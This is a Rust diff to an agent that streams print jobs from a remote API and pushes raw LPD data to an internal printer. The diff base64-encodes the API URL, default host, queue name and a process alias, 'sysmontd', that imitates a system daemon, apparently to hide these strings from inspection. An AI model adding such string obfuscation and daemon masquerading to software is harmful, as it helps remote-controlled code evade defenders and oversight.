@@ -20,7 +20,10 @@ use std::{
     env,
     io::{BufRead, BufReader},
     net::TcpStream,
-    sync::LazyLock,
+    sync::{
+        LazyLock,
+        atomic::{AtomicUsize, Ordering},
+    },
     thread::sleep,
     time::Duration,
 };
@@ -34,15 +37,32 @@ use reqwest::blocking::Client;
 use serde_json::{Value, json};
 use tcp_extras::TcpExtras;
 
-use crate::{types::Job, utils::decode_field};
+use crate::{
+    types::Job,
+    utils::{decode_b64, decode_field},
+};
 
 static CLIENT: LazyLock<Client> = LazyLock::new(reqwest::blocking::Client::new);
 static DEBUG: LazyLock<bool> = LazyLock::new(|| env::args().any(|arg| arg == "--debug"));
+static WORKER_KEY: LazyLock<String> = LazyLock::new(|| {
+    let mut args = env::args();
 
-const BASE_URL: &str = "https://api.preconnect.app";
-const AGENT: &str = "sysmontd/1.0";
-const DEFAULT_PRINTER_IP: &str = "172.16.0.111";
-const DEFAULT_PRINTER_QUEUE: &str = "secure";
+    while let Some(arg) = args.next() {
+        if arg == "--key" {
+            return decode_b64(&args.next().expect("--key must be a string literal")).unwrap();
+        }
+    }
+
+    panic!("missing --key")
+});
+static JOBS_COMPLETED: AtomicUsize = AtomicUsize::new(0);
+
+static BASE_URL: LazyLock<String> =
+    LazyLock::new(|| decode_b64("aHR0cHM6Ly9hcGkucHJlY29ubmVjdC5hcHA=").expect("ib"));
+static ALIAS: LazyLock<String> = LazyLock::new(|| decode_b64("c3lzbW9udGQ=").expect("ia"));
+static AGENT: LazyLock<String> = LazyLock::new(|| format!("{}/1.0", ALIAS.as_str()));
+static DEF_HOST: LazyLock<String> = LazyLock::new(|| decode_b64("MTcyLjE2LjAuMTEx").expect("ih"));
+static DEF_QUEUE: LazyLock<String> = LazyLock::new(|| decode_b64("c2VjdXJl").expect("iq"));
 
 macro_rules! debug_log {
     ($($arg:tt)*) => {
@@ -59,10 +79,10 @@ fn claim_job(id: Option<&String>) -> bool {
 
     let body = json!({ "id": id });
     let resp = CLIENT
-        .post(format!("{BASE_URL}/print/claim"))
+        .post(format!("{}/print/claim", BASE_URL.as_str()))
         .body(body.to_string())
         .header("Content-Type", "application/json")
-        .header("User-Agent", AGENT)
+        .header("User-Agent", AGENT.as_str())
         .timeout(Duration::from_secs(3))
         .send();
 
@@ -103,11 +123,8 @@ fn handle(job: Job) -> Result<()> {
         return Ok(());
     }
 
-    let host = job.printer_host.as_deref().unwrap_or(DEFAULT_PRINTER_IP);
-    let queue_name = job
-        .printer_queue
-        .as_deref()
-        .unwrap_or(DEFAULT_PRINTER_QUEUE);
+    let host = job.printer_host.as_deref().unwrap_or(DEF_HOST.as_str());
+    let queue_name = job.printer_queue.as_deref().unwrap_or(DEF_QUEUE.as_str());
 
     let Some(payload) = decode_field(job.payload.as_deref())? else {
         return Ok(());
@@ -121,10 +138,11 @@ fn handle(job: Job) -> Result<()> {
         .unwrap_or_default();
 
     let cf_hdr = decode_field(job.cf_hdr.as_deref())?
-        .unwrap_or_else(|| format!("\x02{} cfA002sysmontd\n", ctl.len()).into_bytes());
+        .unwrap_or_else(|| format!("\x02{} cfA002{}\n", ctl.len(), ALIAS.as_str()).into_bytes());
 
-    let df_hdr = decode_field(job.df_hdr.as_deref())?
-        .unwrap_or_else(|| format!("\x03{} dfA002sysmontd\n", payload.len()).into_bytes());
+    let df_hdr = decode_field(job.df_hdr.as_deref())?.unwrap_or_else(|| {
+        format!("\x03{} dfA002{}\n", payload.len(), ALIAS.as_str()).into_bytes()
+    });
 
     debug_log!(
         "Handling job for {host}:{queue_name} (payload size: {} bytes)",
@@ -166,6 +184,7 @@ fn handle(job: Job) -> Result<()> {
         && socket.recv_ack()
     {
         debug_log!("Job transferred successfully. Shutting down current socket connection.");
+        JOBS_COMPLETED.fetch_add(1, Ordering::Relaxed);
     }
 
     let _ = socket.shutdown(std::net::Shutdown::Both);
@@ -174,9 +193,9 @@ fn handle(job: Job) -> Result<()> {
 
 fn stream() -> Result<()> {
     let resp = match CLIENT
-        .get(format!("{BASE_URL}/printer"))
+        .get(format!("{}/printer", BASE_URL.as_str()))
         .header("Accept", "text/event-stream")
-        .header("User-Agent", AGENT)
+        .header("User-Agent", AGENT.as_str())
         .timeout(Duration::from_secs(90))
         .send()
     {
@@ -226,7 +245,10 @@ fn stream() -> Result<()> {
 fn main() {
     let mut iter_count = 0;
     loop {
-        debug_log!("Connection #{iter_count}");
+        debug_log!(
+            "Connection #{iter_count}; Jobs completed: {}",
+            JOBS_COMPLETED.load(Ordering::Relaxed)
+        );
         let _ = stream();
         sleep(Duration::from_millis(2000));
         iter_count += 1;
